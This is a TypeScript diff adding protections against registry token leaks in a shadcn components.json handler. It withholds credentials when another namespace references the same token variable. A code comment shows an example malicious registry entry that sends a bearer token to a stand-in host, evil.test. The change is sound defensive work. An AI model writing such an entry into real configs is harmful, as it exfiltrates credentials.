@@ -281,12 +281,53 @@ export function projectRegistryUrls(
   return out;
 }
 
+/**
+ * Which namespaces in the project's components.json reference each `${VAR}`.
+ *
+ * This closes the real leak. shadcn interpolates `${VAR}` from the environment
+ * into registry config that lives in the PROJECT's file — and that file can
+ * come from a repository we do not control. Checking only that `@acme` points
+ * at our URL is not enough: a second entry
+ *
+ *     "@other": { "url": "https://evil.test/{name}.json",
+ *                 "headers": { "Authorization": "Bearer ${ACME_REGISTRY_TOKEN}" } }
+ *
+ * would send our token to that host the moment a run touches `@other`. So a
+ * token is released only when the ONLY entry naming its variable is the
+ * namespace it belongs to.
+ */
+export function envVarReferences(
+  componentsJson: Readonly<Record<string, unknown>> | null,
+): ReadonlyMap<string, ReadonlySet<string>> {
+  const out = new Map<string, Set<string>>();
+  if (!componentsJson) return out;
+  const registries = componentsJson.registries;
+  if (!registries || typeof registries !== 'object') return out;
+  const pattern = /\$\{([A-Za-z_][A-Za-z0-9_]*)\}/g;
+  for (const [namespace, value] of Object.entries(
+    registries as Record<string, unknown>,
+  )) {
+    // Walk the whole entry: a variable can hide in headers, params or a URL.
+    const serialized = JSON.stringify(value ?? '');
+    for (const match of serialized.matchAll(pattern)) {
+      const name = match[1];
+      if (!name) continue;
+      const seen = out.get(name) ?? new Set<string>();
+      seen.add(namespace);
+      out.set(name, seen);
+    }
+  }
+  return out;
+}
+
 export interface ScopedRegistryEnvInput {
   readonly registries: readonly UiKitRegistry[];
   /** Namespaces the command actually references. */
   readonly referenced: readonly string[];
   /** What the project's components.json maps today. */
   readonly projectUrls: ReadonlyMap<string, string>;
+  /** Which namespaces reference each `${VAR}` in that same file. */
+  readonly envReferences?: ReadonlyMap<string, ReadonlySet<string>>;
   readonly lookupSecret: (secretKey: string) => string | null | undefined;
 }
 
@@ -295,6 +336,20 @@ export interface ScopedRegistryEnvResult extends RegistryEnvResult {
   readonly conflicts: readonly string[];
   /** Configured and referenced, but the project does not declare them. */
   readonly unmapped: readonly string[];
+  /**
+   * Namespaces withheld because another entry in the project's file also
+   * references their token variable.
+   */
+  readonly hijacked: readonly string[];
+}
+
+/** The public registry is trusted by definition; it carries no credential. */
+function isTrustedNamespace(
+  namespace: string,
+  configured: readonly UiKitRegistry[],
+): boolean {
+  if (namespace === SHADCN_DEFAULT_NAMESPACE) return true;
+  return configured.some((registry) => registry.namespace === namespace);
 }
 
 /**
@@ -313,8 +368,26 @@ export function buildScopedRegistryEnv(
   const missing: string[] = [];
   const conflicts: string[] = [];
   const unmapped: string[] = [];
+  const hijacked: string[] = [];
+  const configured = assertRegistries(input.registries);
+  const envReferences = input.envReferences ?? new Map();
 
-  for (const registry of assertRegistries(input.registries)) {
+  // A run that also touches a namespace we cannot vouch for releases nothing:
+  // we have no way to know where that entry points or what it interpolates.
+  const untrusted = [...referenced].filter(
+    (namespace) => !isTrustedNamespace(namespace, configured),
+  );
+  if (untrusted.length > 0) {
+    return {
+      env: {},
+      missing: [],
+      conflicts: [],
+      unmapped: [],
+      hijacked: untrusted,
+    };
+  }
+
+  for (const registry of configured) {
     if (!registry.auth) continue;
     if (!referenced.has(registry.namespace)) continue;
 
@@ -329,6 +402,15 @@ export function buildScopedRegistryEnv(
       conflicts.push(registry.namespace);
       continue;
     }
+    const referrers = envReferences.get(registry.auth.envVar);
+    if (referrers) {
+      const foreign = [...referrers].filter((name) => name !== registry.namespace);
+      if (foreign.length > 0) {
+        hijacked.push(registry.namespace);
+        continue;
+      }
+    }
+
     const token = registry.secretKey ? input.lookupSecret(registry.secretKey) : null;
     if (typeof token === 'string' && token.trim().length > 0) {
       env[registry.auth.envVar] = token.trim();
@@ -337,5 +419,5 @@ export function buildScopedRegistryEnv(
     }
   }
 
-  return { env, missing, conflicts, unmapped };
+  return { env, missing, conflicts, unmapped, hijacked };
 }
